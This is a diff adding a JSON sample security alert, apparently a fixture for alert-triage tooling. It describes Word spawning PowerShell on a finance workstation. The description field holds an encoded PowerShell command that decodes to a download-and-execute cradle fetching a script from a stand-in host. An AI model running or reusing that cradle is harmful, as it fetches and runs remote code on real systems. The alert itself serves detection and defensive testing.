@@ -1,0 +1,17 @@
+{
+  "alert_id": "ALT-2026-002",
+  "timestamp": "2026-11-02T08:22:10Z",
+  "event_type": "Suspicious Process Execution",
+  "source_ip": "10.0.4.15",
+  "destination_ip": "203.0.113.88",
+  "username": "jdoe",
+  "hostname": "wkst-fin-042.corp.internal",
+  "description": "powershell.exe executed with flags -ExecutionPolicy Bypass -NoProfile -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA4ADgALwBzAC4AcABzADEAJwApAA==",
+  "severity": "CRITICAL",
+  "event_source": "CrowdStrike Falcon EDR",
+  "additional_context": {
+    "process_name": "powershell.exe",
+    "parent_process": "winword.exe",
+    "command_line": "powershell.exe -ExecutionPolicy Bypass -enc <payload>"
+  }
+}
